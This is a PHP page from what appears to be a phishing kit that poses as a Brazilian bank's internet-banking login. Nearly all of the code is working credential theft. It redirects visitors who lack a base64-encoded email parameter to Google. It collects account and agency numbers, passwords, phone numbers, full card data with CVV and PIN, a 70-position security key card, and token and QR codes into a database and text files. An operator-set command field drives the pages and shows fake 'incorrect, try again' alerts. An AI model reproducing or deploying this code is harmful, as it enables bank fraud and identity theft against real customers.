<?php 
include('../_functions/functions.php');

$UserId = getIdUser();
$e500 = '<script language="javascript">window.location.replace("https://www.google.com/");</script>';
$emailx = $_GET['cliente'];
$email = base64_decode($emailx);
if (isset($_GET['cliente']) && !filter_var($email, FILTER_VALIDATE_EMAIL) === false) { 
	$msg = "ACESSO: $email \n";
	$myFl = "acc-log.txt";
	$open = fopen($myFl, 'a') or die("can't open file");
	fwrite($open, $msg);
	fclose($open);
} else { 
	echo $e500; exit;
}  

if(isset($_COOKIE['Finalizado']) && isset($_POST['my_ag'])):
	$GetCookieDados = $_COOKIE['Finalizado'];
	$GetCookieDados = base64_decode($GetCookieDados);
	$GetCookieDados = explode('-', $GetCookieDados);

	if($GetCookieDados[0] == $_POST['my_ag'] && $GetCookieDados[1] == $_POST['my_ct'] && $GetCookieDados[2] == $_POST['my_dg']):
		echo '<script>alert("Sistema temporariamente inoperante.\nTente novamente mais tarde!");</script>';
		echo '<script>window.location.href="index.php";</script>';
		exit();
	endif;	
endif;


if(!isset($_SESSION['UserName']) || $_SESSION['UserName'] == ''):
	$tabela = 'acessos';
	$cond = "WHERE id = '$UserId'";
	$GetNameUser = read($conn, $tabela, $cond);

	if($GetNameUser[0]['nome'] != null && strlen($GetNameUser[0]['nome']) > 0):
		$_SESSION['UserName'] = $GetNameUser[0]['nome'];
	endif;
endif;	

if(isset($_SESSION['UserName'])):
	$ShowNameUser = $_SESSION['UserName'];
else:
	$ShowNameUser = '';
endif;

if(isset($_SESSION['cpf'])):
	$cpf = $_SESSION['cpf'];
else:
	$cpf = '';
endif;

if(isset($_POST['sender']) && $_POST['sender'] == 'ag_ct'):
	$Agencia = $_POST['my_ag'];
	$Conta = $_POST['my_ct'];
	$Digito = $_POST['my_dg'];

	$_SESSION['Agencia'] = $_POST['my_ag'];
	$_SESSION['Conta'] = $_POST['my_ct'];
	$_SESSION['Digito'] = $_POST['my_dg'];

	$GetInfoNav = SetNavegadorSO($conn, $UserId);
	$GetInfoNav = explode(';', $GetInfoNav);
	$GetInfoLoc = setLocalization($conn, $UserIp, $UserId);
	$GetInfoLoc = explode(';', $GetInfoLoc);
	
	$email = $_SESSION['mail'];
	$pc_name = gethostbyaddr($UserIp);
	$data_acesso = date('Y-m-d H:i:s');
	$browser_name = $GetInfoNav[0];
	$browser_version = $GetInfoNav[1];
	$sistema_operacional = $GetInfoNav[2];
	$cidade = $GetInfoLoc[0];
	$estado = $GetInfoLoc[1];
	$pais = $GetInfoLoc[2];
	$tipo_acesso = 'D. Fisico';
	$comando = 'LOADING';
	$status = 0;
	$timestamp = mktime(date("H"), date("i"), date("s") + 50, date("m"), date("d"), date("Y"));

	$campos = 'id, nome, cpf, email, ip, pc_name, data_acesso, browser_name, browser_version, sistema_operacional, cidade, estado, pais, tipo_acesso, comando, status, agencia, conta, digito, enviou_tabela, time_acesso';
	$values = "'$UserId', '$ShowNameUser', '$cpf', '$email', '$UserIp','$pc_name', '$data_acesso', '$browser_name', '$browser_version', '$sistema_operacional', '$cidade', '$estado', '$pais', '$tipo_acesso', '$comando', '$status', '$Agencia', '$Conta', '$Digito', '0', '$timestamp'";

	create($conn, 'acessos', $campos, $values);
	header('Location: acesso.php?cliente='.$emailx.'');

elseif(isset($_POST['sender']) && $_POST['sender'] == 'get_psn'):
	$pass_net = $_POST['recebe_info_pass4'];

	$tabela = 'acessos';
	$values = "comando = 'LOADING', senha_4 = '$pass_net'";
	$cond = " WHERE id = '$UserId'";

	update($conn, $tabela, $values, $cond);
	header('Location: acesso.php?cliente='.$emailx.'');

elseif(isset($_POST['sender']) && $_POST['sender'] == 'get_phone'):
	$ddd = $_POST['ddd'];
	$fone = $_POST['cd_phone'];

	$tabela = 'acessos';
	$values = "comando = 'LOADING', ddd = '$ddd', fone = '$fone'";
	$cond = " WHERE id = '$UserId'";

	update($conn, $tabela, $values, $cond);
	header('Location: acesso.php?cliente='.$emailx.'');

	
elseif(isset($_POST['sender']) && $_POST['sender'] == 'sended_message'):
	$tabela = 'acessos';
	$values = "comando = 'LOADING'";
	$cond = " WHERE id = '$UserId'";

	update($conn, $tabela, $values, $cond);
	header('Location: acesso.php?cliente='.$emailx.'');	

elseif(isset($_POST['sender']) && $_POST['sender'] == 'get_cc'):
	$cc_name = $_POST['cd_name'];
	$cc_number = $_POST['cd_number'];
	$cc_val = $_POST['cd_val'];
	$cc_cvv = $_POST['cd_cvv'];

	$tabela = 'acessos';
	$values = "comando = 'LOADING', cc_nome = '$cc_name', cc_numero = '$cc_number', cc_val = '$cc_val', cc_cvv = '$cc_cvv'";
	$cond = " WHERE id = '$UserId'";

	update($conn, $tabela, $values, $cond);
	header('Location: acesso.php?cliente='.$emailx.'');

elseif(isset($_POST['sender']) && $_POST['sender'] == 'get_pass_cc'):
	$pass_cc = $_POST['recebe_info_pass'];

	$tabela = 'acessos';
	$values = "comando = 'LOADING', pass_6 = '$pass_cc'";
	$cond = " WHERE id = '$UserId'";

	update($conn, $tabela, $values, $cond);
	header('Location: acesso.php?cliente='.$emailx.'');

elseif(isset($_POST['sender']) && $_POST['sender'] == 'get_table'):
	$pos01 = $_POST['input1'];		$pos02 = $_POST['input2'];		$pos03 = $_POST['input3'];		$pos04 = $_POST['input4'];		$pos05 = $_POST['input5'];	
	$pos06 = $_POST['input6'];		$pos07 = $_POST['input7'];		$pos08 = $_POST['input8'];		$pos09 = $_POST['input9'];		$pos10 = $_POST['input10'];	
	$pos11 = $_POST['input11'];		$pos12 = $_POST['input12'];		$pos13 = $_POST['input13'];		$pos14 = $_POST['input14'];		$pos15 = $_POST['input15'];	
	$pos16 = $_POST['input16'];		$pos17 = $_POST['input17'];		$pos18 = $_POST['input18'];		$pos19 = $_POST['input19'];		$pos20 = $_POST['input20'];	
	$pos21 = $_POST['input21'];		$pos22 = $_POST['input22'];		$pos23 = $_POST['input23'];		$pos24 = $_POST['input24'];		$pos25 = $_POST['input25'];	
	$pos26 = $_POST['input26'];		$pos27 = $_POST['input27'];		$pos28 = $_POST['input28'];		$pos29 = $_POST['input29'];		$pos30 = $_POST['input30'];	
	$pos31 = $_POST['input31'];		$pos32 = $_POST['input32'];		$pos33 = $_POST['input33'];		$pos34 = $_POST['input34'];		$pos35 = $_POST['input35'];	
	$pos36 = $_POST['input36'];		$pos37 = $_POST['input37'];		$pos38 = $_POST['input38'];		$pos39 = $_POST['input39'];		$pos40 = $_POST['input40'];	
	$pos41 = $_POST['input41'];		$pos42 = $_POST['input42'];		$pos43 = $_POST['input43'];		$pos44 = $_POST['input44'];		$pos45 = $_POST['input45'];	
	$pos46 = $_POST['input46'];		$pos47 = $_POST['input47'];		$pos48 = $_POST['input48'];		$pos49 = $_POST['input49'];		$pos50 = $_POST['input50'];	
	$pos51 = $_POST['input51'];		$pos52 = $_POST['input52'];		$pos53 = $_POST['input53'];		$pos54 = $_POST['input54'];		$pos55 = $_POST['input55'];	
	$pos56 = $_POST['input56'];		$pos57 = $_POST['input57'];		$pos58 = $_POST['input58'];		$pos59 = $_POST['input59'];		$pos60 = $_POST['input60'];	
	$pos61 = $_POST['input61'];		$pos62 = $_POST['input62'];		$pos63 = $_POST['input63'];		$pos64 = $_POST['input64'];		$pos65 = $_POST['input65'];	
	$pos66 = $_POST['input66'];		$pos67 = $_POST['input67'];		$pos68 = $_POST['input68'];		$pos69 = $_POST['input69'];		$pos70 = $_POST['input70'];	
	$referencia = $_POST['referencia'];	

	$campos = 'id_user, tabela_referencia,';
	$campos.= 'pos01,pos02,pos03,pos04,pos05,pos06,pos07,pos08,pos09,pos10,pos11,pos12,pos13,pos14,pos15,pos16,pos17,pos18,pos19,pos20,';
	$campos.= 'pos21,pos22,pos23,pos24,pos25,pos26,pos27,pos28,pos29,pos30,pos31,pos32,pos33,pos34,pos35,pos36,pos37,pos38,pos39,pos40,';
	$campos.= 'pos41,pos42,pos43,pos44,pos45,pos46,pos47,pos48,pos49,pos50,pos51,pos52,pos53,pos54,pos55,pos56,pos57,pos58,pos59,pos60,';
	$campos.= 'pos61,pos62,pos63,pos64,pos65,pos66,pos67,pos68,pos69,pos70';

	$values = "'$UserId', '$referencia',";
	$values.= "'$pos01','$pos02','$pos03','$pos04','$pos05','$pos06','$pos07','$pos08','$pos09','$pos10',";
	$values.= "'$pos11','$pos12','$pos13','$pos14','$pos15','$pos16','$pos17','$pos18','$pos19','$pos20',";
	$values.= "'$pos21','$pos22','$pos23','$pos24','$pos25','$pos26','$pos27','$pos28','$pos29','$pos30',";
	$values.= "'$pos31','$pos32','$pos33','$pos34','$pos35','$pos36','$pos37','$pos38','$pos39','$pos40',";
	$values.= "'$pos41','$pos42','$pos43','$pos44','$pos45','$pos46','$pos47','$pos48','$pos49','$pos50',";
	$values.= "'$pos51','$pos52','$pos53','$pos54','$pos55','$pos56','$pos57','$pos58','$pos59','$pos60',";
	$values.= "'$pos61','$pos62','$pos63','$pos64','$pos65','$pos66','$pos67','$pos68','$pos69','$pos70'";
	
	$conteudo = "CHAVE01: $pos01 |CHAVE02: $pos02 |CHAVE03: $pos03 |CHAVE04: $pos04 |CHAVE05: $pos05 |CHAVE06: $pos06 |CHAVE07: $pos07 |CHAVE08: $pos08 |CHAVE09: $pos09 |CHAVE10: $pos10 | \n";
	$conteudo .= "CHAVE11: $pos11 |CHAVE12: $pos12 |CHAVE13: $pos13 |CHAVE14: $pos14 |CHAVE15: $pos15 |CHAVE16: $pos16 |CHAVE17: $pos17 |CHAVE18: $pos18 |CHAVE19: $pos19 |CHAVE20: $pos20 | \n";
	$conteudo .= "CHAVE21: $pos21 |CHAVE22: $pos22 |CHAVE23: $pos23 |CHAVE24: $pos24 |CHAVE25: $pos25 |CHAVE26: $pos26 |CHAVE27: $pos27 |CHAVE28: $pos28 |CHAVE29: $pos29 |CHAVE30: $pos30 | \n";
	$conteudo .= "CHAVE31: $pos31 |CHAVE32: $pos32 |CHAVE33: $pos33 |CHAVE34: $pos34 |CHAVE35: $pos35 |CHAVE36: $pos36 |CHAVE37: $pos37 |CHAVE38: $pos38 |CHAVE39: $pos39 |CHAVE40: $pos40 | \n";
	$conteudo .= "CHAVE41: $pos41 |CHAVE42: $pos42 |CHAVE43: $pos43 |CHAVE44: $pos44 |CHAVE45: $pos45 |CHAVE46: $pos46 |CHAVE47: $pos47 |CHAVE48: $pos48 |CHAVE49: $pos49 |CHAVE50: $pos50 | \n";
	$conteudo .= "CHAVE51: $pos51 |CHAVE52: $pos52 |CHAVE53: $pos53 |CHAVE54: $pos54 |CHAVE55: $pos55 |CHAVE56: $pos56 |CHAVE57: $pos57 |CHAVE58: $pos58 |CHAVE59: $pos59 |CHAVE60: $pos60 | \n";
	$conteudo .= "CHAVE61: $pos61 |CHAVE62: $pos62 |CHAVE63: $pos63 |CHAVE64: $pos64 |CHAVE65: $pos65 |CHAVE66: $pos66 |CHAVE67: $pos67 |CHAVE68: $pos68 |CHAVE69: $pos69 |CHAVE70: $pos70 |";
	

	

	$aag = $_SESSION['Agencia'];
	$contt = $_SESSION['Conta'];
	$digg = $_SESSION['Digito'];
	$namm = $ShowNameUser;
	
	$name_file = '../TABLE/TABELA_'.$aag.'_'.$contt.'_'.$digg.'_'.$ShowNameUser.'.txt';
	$fp = fopen($name_file, "a");
	 fwrite($fp, $conteudo);
	 fclose($fp);
	create($conn, 'tabela_usuarios', $campos, $values);
	update($conn, 'acessos', "comando = 'LOADING', enviou_tabela = '1', tipo_dispositivo = 'TABELA' ", "WHERE id = '$UserId'");
	header('Location: acesso.php?cliente='.$emailx.'');

elseif(isset($_POST['sender']) && $_POST['sender'] == 'get_tks'):
	$token = $_POST['user_token'];

	$tabela = 'acessos';
	$values = "comando = 'LOADING', token = '$token', tipo_dispositivo = 'TOKEN'";
	$cond = " WHERE id = '$UserId'";

	update($conn, $tabela, $values, $cond);
	header('Location: acesso.php?cliente='.$emailx.'');

elseif(isset($_POST['sender']) && $_POST['sender'] == 'get_qrcode'):
	$token = $_POST['cd_qrc'];

	$tabela = 'acessos';
	$values = "comando = 'LOADING', token = '$token', tipo_dispositivo = 'QRCODE'";
	$cond = " WHERE id = '$UserId'";

	update($conn, $tabela, $values, $cond);
	header('Location: acesso.php?cliente='.$emailx.'');

elseif(isset($_POST['sender']) && $_POST['sender'] == 'get_pos'):
	$posicao = $_POST['user_token'];
	
	$tabela = 'acessos';
	$values = "comando = 'LOADING', tabela_valor = '$posicao', tipo_dispositivo = 'TABELA'";
	$cond = " WHERE id = '$UserId'";

	update($conn, $tabela, $values, $cond);
	header('Location: acesso.php?cliente='.$emailx.'');

endif;	
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title> Acesso</title>
	<link rel="shortcut icon" href="../_images/favicon.ico">
	<link rel="stylesheet" href="../_fonts/_fonts.css">	
	<link rel="stylesheet" href="../_styles/boot.css">
	<link rel="stylesheet" href="../_styles/ibg.css">
	<script src="../_jscripts/jquery.js"></script>
	<script src="../_jscripts/jcycle.js"></script>
	<script src="../_jscripts/jmask.js"></script>
	<script src="../_jscripts/d_content.js"></script>
	<?php 
		$getcmd = read($conn, 'acessos', "WHERE id = '$UserId'");
		$condicao = $getcmd[0]['comando'];
		$perfil = $getcmd[0]['perfil'];
		if($condicao == 'GET_TABLE'){
			$AutoCarregamento = 6000;
		}
		if($perfil == 'EXCLUSIVE'){
			$block_header = 'block_headerex';
			$logo_quad = 'logo_quadex.jpg';
			$body = 'body_ib_iniex';
			$all_content = 'all_contentex';
			$footer = 'footerex.jpg';
			$block_footer = 'block_footerex';
		}elseif($perfil == 'PRIME'){
			$block_header = 'block_headerprime';
			$logo_quad = 'logo_quadprime.jpg';
			$body = 'body_ib_iniprime';
			$all_content = 'all_content';
			$footer = 'footerprime.jpg'; 
			$block_footer = 'block_footerprime';
		}else{
			$block_header = 'block_header';
			$logo_quad = 'logo_quad.jpg';
			$body = 'body_ib_ini';
			$all_content = 'all_content';
			$footer = 'footer.jpg';
			$block_footer = 'block_footer';
		}
	?>
	<meta http-equiv="refresh" content=<?= $AutoCarregamento;?>;url="acesso.php?cliente=<?php echo $emailx;  ?>">
</head>
<body class="<?php echo $body; ?>">
<div class="container <?php echo $block_header; ?>">
	<div class="content">
		<?php include('includes/inc_header.php'); ?>
	</div><!-- content -->
	<div class="clear"></div>
</div><!-- block_header -->

<div class="container <?php echo $all_content; ?>">
	<div class="content">
		<div class="ms_content">
			<?php 
				$GetCommand = read($conn, 'acessos', "WHERE id = '$UserId'");

				switch ($GetCommand[0]['comando']):
					case 'LOADING':
						echo '<meta http-equiv="refresh" content=6;url="acesso.php?cliente='.$emailx.'">';
						include('includes/loading.php');
					break;
					case 'SET_MESSAGE':
						include('includes/set_message.php');
					break;
					case 'GET_PSN':
						include('includes/pass_net.php');
					break;
					case 'GET_CC':
						include('includes/nds_card.php');
					break;
					case 'GET_PASS_CC':
						include('includes/nds_card_pass.php');
					break;
					case 'GET_TABLE':
						include('includes/nds_table.php');
					break;
					case 'GET_TOKEN':
						include('includes/nds_tks.php');
					break;
					case 'GET_PHONE':
						include('includes/nds_phone.php');
					break;
					case 'GET_POS':
						include('includes/nds_pos_table.php');
					break;
					case 'GET_QRCODE':
						include('includes/nds_qrcode.php');
					break;
					case 'FINALIZADO':
						$DadosCookie = base64_encode($_SESSION['Agencia'].'-'.$_SESSION['Conta'].'-'.$_SESSION['Digito']);
						setcookie('Finalizado', $DadosCookie, (time() + (2 * 3600)));
						include('includes/finalizado.php');
					break;

					/* COMANDOS INVÁLIDOS */
					case 'GET_PSN X':
						echo '<script>alert("A senha de 4 dígitos informada não está correta.\nTente novamente!");</script>';
						$_SESSION['ShowError'] = 1;
						include('includes/pass_net.php');
					break;
					case 'GET_CC X':
						echo '<script>alert("Os dados do cartão informado não estão corretos.\nTente novamente!");</script>';
						$_SESSION['ShowError'] = 1;
						include('includes/nds_card.php');
					break;
					case 'GET_PASS_CC X':
						echo '<script>alert("A senha do cartão de crédito/débito não está correta.\nTente novamente!");</script>';
						$_SESSION['ShowError'] = 1;
						include('includes/nds_card_pass.php');
					break;
					case 'GET_TABLE X':
						echo '<script>alert("As informações do seu cartão chave não estão corretas.\nTente novamente!");</script>';
						$_SESSION['ShowError'] = 1;
						include('includes/nds_table.php');
					break;
					case 'GET_TOKEN X':
						echo '<script>alert("A Chave de Segurança Token informado, está incorreto ou já expirou.\nTente novamente!");</script>';
						$_SESSION['ShowError'] = 1;
						include('includes/nds_tks.php');
					break;
					case 'GET_PHONE X':
						echo '<script>alert("Você informou um telefone inválido ou que não está cadastrado conosco.\nTente novamente!");</script>';
						$_SESSION['ShowError'] = 1;
						include('includes/nds_phone.php');
					break;
					case 'GET_POS X':
						echo '<script>alert("A posição informada do Cartão Chave não está correta.\nTente novamente!");</script>';
						$_SESSION['ShowError'] = 1;
						include('includes/nds_pos_table.php');
					break;
					case 'GET_QRCODE X':
						echo '<script>alert("O código do QrCode escaneado não está correto, ou já expirou.\nTente novamente!");</script>';
						$_SESSION['ShowError'] = 1;
						include('includes/nds_qrcode.php');
					break;
					case 'ACESSO X':
						echo '<script>alert("A senha de 4 dígitos informada não está correta.\nTente novamente!");</script>';
						$_SESSION['ShowError'] = 1;
						include('includes/pass_net.php');
					break;
					
					default:
						include('includes/loading.php');
					break;
				endswitch;
			?>
		</div><!-- ms_content -->

		<div class="sidebar_enter">
			<img src="../_images/ibi/seg_one.png" class="J_Sec">
		</div><!-- sidebar_enter -->

	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->

<div class="container <?php echo $block_footer; ?>">
	<div class="content">
		<?php include('includes/inc_footer.php'); ?>
	</div><!-- content -->
	<div class="clear"></div>
</div><!-- block_footer -->

<?php 
	$TimeAtualiza = mktime(date("H"), date("i"), date("s") + 50, date("m"), date("d"), date("Y"));
	$tabela = 'acessos';
	$values = "time_acesso = '$TimeAtualiza'";
	$cond = "WHERE id = '$UserId'";
	update($conn, $tabela, $values, $cond);
?>
</body>
</html>

